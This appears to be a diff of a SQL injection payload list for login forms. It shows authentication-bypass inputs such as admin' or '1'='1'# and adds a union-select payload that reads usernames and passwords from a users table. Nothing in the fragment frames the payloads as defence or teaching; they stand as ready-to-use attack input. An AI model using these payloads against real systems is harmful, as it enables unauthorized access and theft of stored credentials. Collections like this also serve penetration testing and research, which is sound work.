@@ -15,3 +15,8 @@ password : admin' or '1'='1'#
 
 username : admin' or '1'='1'/*
 password : admin' or '1'='1'/*
+
+
+
+username admin' or id='1' union select username,password from users-- -+
+password
